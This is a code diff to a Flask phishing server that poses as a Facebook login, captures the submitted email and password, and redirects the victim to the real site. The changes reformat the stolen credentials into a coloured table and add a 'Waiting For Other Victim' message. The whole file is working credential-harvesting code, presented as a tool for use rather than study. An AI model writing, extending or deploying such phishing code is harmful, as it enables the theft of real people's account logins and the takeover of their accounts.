@@ -1,4 +1,6 @@
 from flask import *
+from termcolor import colored
+from prettytable import PrettyTable
 
 app = Flask(__name__)
 
@@ -23,12 +25,13 @@ def index():
 def facebook():  
       uname=request.form['email']  
       passwrd=request.form['password']
-      print('''
-            Credentials Found:
-                    Email: {},
-                    password: {}
-
-      '''.format(uname,passwrd))
+      x = PrettyTable()
+      x.field_names = ["Email","password"]
+      print(x.add_row([uname,passwrd]))
+      print('''Credentials Found:    ''')
+      print(colored(x, 'cyan'))
+      print(''' Waiting For Other Victim ''')
+ 
  
       return redirect("http://www.facebook.com")
       
